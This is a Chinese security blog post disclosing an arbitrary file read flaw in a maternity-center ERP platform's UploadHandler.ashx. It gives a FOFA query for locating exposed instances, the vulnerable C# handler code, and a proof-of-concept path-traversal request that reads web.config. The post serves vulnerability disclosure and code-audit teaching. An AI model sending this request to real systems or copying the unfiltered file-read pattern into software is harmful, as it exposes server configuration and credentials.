---
title: "月子会所ERP管理云平台 Page/upload/UploadHandler.ashx 任意文件读取漏洞"
source: https://mrxn.net/jswz/mamabaohe-UploadHandler-url-fileread.html
asset_dir: assets/月子会所erp管理云平台-pageuploaduploadhandler.ashx-任意文件读取漏洞
---

# 月子会所ERP管理云平台 Page/upload/UploadHandler.ashx 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/27 08:36
- 850浏览
- [0评论](#comment)
- 18分钟阅读

深入探索

Server

服务器

企业资源计划

---

# 漏洞简介

月子会所ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理[软件](#)。月子会所ERP管理云平台的 Page/upload/UploadHandler.ashx 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可利用该漏洞读取服务器上敏感文件。

企业资源规划

# fofa语法

> `body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx" || app="妈妈宝盒-ERP"`

# 漏洞分析

深入探索

安全研究工具

SQL

漏洞预警服务

UploadHandler 的业务逻辑实现如下

```
public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "application/json";
        HttpFileCollection flist = context.Request.Files;

        string UploadURL = context.Request.QueryString["url"];

        if (string.IsNullOrEmpty(UploadURL))
        {
            context.Response.Write(JsonConvert.SerializeObject(new { code = 0, info = "所给的上传路径不正确!" }));
            context.Response.End();
        }
        string Content = null;
        if (!string.IsNullOrEmpty(UploadURL))
        {
            var basepath = context.Server.MapPath(UploadURL);//绝对路径
            FileStream fileStream = new FileStream(basepath, FileMode.Open, FileAccess.Read, FileShare.Read); //打开文件
                                                                                                               // 读取文件Byte[]
            byte[] bytes = new byte[fileStream.Length];
            fileStream.Read(bytes, 0, bytes.Length);
            fileStream.Close();
            Stream stream = new MemoryStream(bytes); //byte[]转换为Stream
            StreamReader strm = new StreamReader(stream);
            Content = strm.ReadToEnd();
        }
        context.Response.Write(JsonConvert.SerializeObject(new { code = 200, data = Content }));
        context.Response.End();
    }
```

url参数 ==> UploadURL ==> basepath ==> FileStream，直接使用 FileStream 读取文件后以 json 格式返回读取内容，整个过程对文件无任何过滤，造成任意文件读取[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E) 朴实无华！

云存储

# 漏洞复现

```
GET /Page/upload/UploadHandler.ashx?url=../../web.config HTTP/1.1
Host: mamabaohe.mrxn.net
```

[![月子会所ERP管理云平台 Page/upload/UploadHandler.ashx 任意文件读取漏洞](images/img-001-da1244c02432.webp)](https://image.mrxn.net/5f070b4b2f4d41a99f659648a36698e3.webp)

成功读取到 web.config 配置文件内容。

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [4.漏洞复现](#toc-4-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
